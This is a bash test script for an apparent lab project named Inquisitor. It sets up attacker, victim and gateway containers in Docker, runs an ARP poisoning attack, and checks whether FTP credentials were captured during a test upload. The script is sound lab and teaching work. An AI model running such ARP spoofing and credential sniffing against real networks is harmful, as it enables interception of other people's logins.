#!/bin/bash
echo "Setting up test environment..."

# Create necessary directories
mkdir -p ftp_uploads

# Build and start containers
echo "Building and starting containers..."
docker-compose up --build -d

# Wait for containers to be ready
echo "Waiting for containers to be ready..."
sleep 10

# Get container information (dynamic IPs from Docker)
echo -e "\nResolving container IPs..."
GATEWAY_IP=$(docker inspect -f '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' inquisitor_gateway)
VICTIM_IP=$(docker inspect -f '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' inquisitor_victim)

# Get MAC addresses
echo -e "\nGetting MAC addresses..."
GATEWAY_MAC=$(docker exec inquisitor_gateway ip link show eth0 | grep link/ether | awk '{print $2}')
VICTIM_MAC=$(docker exec inquisitor_victim ip link show eth0 | grep link/ether | awk '{print $2}')

echo "Gateway: $GATEWAY_IP ($GATEWAY_MAC)"
echo "Victim: $VICTIM_IP ($VICTIM_MAC)"

# Build the project
echo -e "\nBuilding Inquisitor..."
docker exec -w /app inquisitor_attacker mkdir -p build
docker exec -w /app/build inquisitor_attacker cmake ..
docker exec -w /app/build inquisitor_attacker make

# Run the ARP poisoning attack in the background
echo -e "\nStarting ARP poisoning attack..."
COMMAND="/app/build/inquisitor $GATEWAY_IP $GATEWAY_MAC $VICTIM_IP $VICTIM_MAC -v > /tmp/inquisitor.log 2>&1"
docker exec -d inquisitor_attacker bash -c "$COMMAND"

# Wait for ARP poisoning to take effect
echo -e "\nWaiting for ARP poisoning to take effect..."
sleep 5

# Test FTP connection from victim to gateway
echo -e "\nTesting FTP connection from victim to gateway..."
docker exec inquisitor_victim sh -c "echo 'Test file' > /ftp_uploads/test_upload.txt"
# Upload into the writable /upload directory on the FTP server
docker exec inquisitor_victim lftp -e 'set ssl:verify-certificate no; put /ftp_uploads/test_upload.txt -o /upload/uploaded.txt; quit' $GATEWAY_IP

# Check if the file was transferred
echo -e "\nChecking if file was transferred..."
if docker exec inquisitor_gateway ls /home/ftp/upload/uploaded.txt > /dev/null 2>&1; then
    echo "SUCCESS: File transfer detected!"
    echo "Inquisitor should have captured the FTP credentials."
else
    echo "ERROR: File transfer failed!"
fi

echo -e "\nCaptured output from inquisitor_attacker (from /tmp/inquisitor.log):"
docker exec inquisitor_attacker sh -c 'if [ -f /tmp/inquisitor.log ]; then tail -n 50 /tmp/inquisitor.log; else echo "No captured output file found."; fi'

echo -e "\nTest complete. Check the attacker's console for captured credentials."
echo "To stop the containers, run: docker-compose down"
